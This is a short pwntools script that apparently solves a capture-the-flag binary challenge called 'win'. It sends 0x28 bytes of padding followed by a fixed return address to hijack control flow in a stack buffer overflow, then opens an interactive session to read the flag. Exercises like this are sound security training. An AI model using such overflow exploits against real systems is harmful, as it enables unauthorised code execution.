from pwn import *


# initialize the binary
elf = context.binary = ELF("./win")

if args.REMOTE: # use python3 solve.py REMOTE
    p = remote("byuctf.xyz", 40002)
else:
    p = elf.process()


# craft payload
payload = b'a' * 0x28
payload += p64(0x4011c9)


# get to input and send payload
p.recvline()
p.sendline(payload)


# get flag!
p.interactive()